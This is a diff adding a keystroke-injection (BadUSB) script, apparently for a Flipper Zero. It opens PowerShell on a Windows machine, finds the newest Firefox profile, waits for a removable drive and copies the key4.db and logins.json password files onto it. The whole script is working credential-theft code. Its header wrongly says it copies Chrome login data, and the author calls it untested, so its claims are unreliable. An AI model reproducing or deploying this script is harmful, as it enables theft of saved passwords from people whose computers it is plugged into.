@@ -1,0 +1,56 @@
+REM_BLOCK
+
+ Title: 		PSChromeCopy_FlipImg
+ Author: 		aves-frog
+ Description: 	Copies Chrome Login Data to flipper img/Last inserted USB
+ Target:		Windows 10+
+ 
+ IMPORTANT:		This script is based on theoretical function and the official Firefox documentation, this has not been tested
+ 
+ Note: 			This script looks for the last inserted USB, as such you do not need to use an image on your flipper
+				It does however give you the time to navigate to Apps/USB/Mass Storage (or alternative) without using a time limit
+ 
+END_REM
+
+REM *If this script doesn't work, please try removing all empty lines and the REM_Block*
+
+DEFAULTDELAY 5
+
+REM *Open PowerShell*
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 5000
+
+REM *This line is used to listen for changes in USB storage devices, this is used later to detect changes*
+STRING Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange
+ENTER
+
+REM *Go to the folder, note I use the Default profile, you can change this to any profile ID you wish (Commonly Profile 1 etc)*
+REM *Also note that the first logged in account on Chrome will typically be assigned the Default profile*
+DELAY 10
+STRING cd $env:APPDATA
+ENTER
+DELAY 10
+STRING cd "Mozilla/Firefox/Profiles/"
+ENTER
+
+REM *Find the randomly generated profile name, based on which is created last*
+STRING $Profile = gci ./ | sort LastWriteTime | select -last 1
+ENTER
+STRING cd $Profile
+ENTER
+
+REM *Getting the local time, this is used to generate a psuedo random file name while also allowing for easy sorting and file management if deployed multiple times*
+DELAY 10
+STRING $Time = Get-Date -Format "dd-MM-yyyy-HH-mm-ss"
+ENTER
+
+REM_BLOCK
+	Explanation will be added after succesful testing
+	
+	Note: Firefox has two files containing passwords: login.json and key4.db (https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data)
+END_REM
+STRING $newEvent = Wait-Event -SourceIdentifier volumeChange; Start-Sleep -Seconds 2; $DriveLetter = volume | ? drivetype -eq removable | % driveletter; $Path = $DriveLetter + ":/" + $Time + "key4.db"; $Path1 = $DriveLetter + ":/" + $Time + "logins.json"; Copy-Item -Path "./key4.db" -Destination $Path -Recurse; Copy-Item -Path "./logins.json" -Destination $Path1 -Recurse; exit
+ENTER
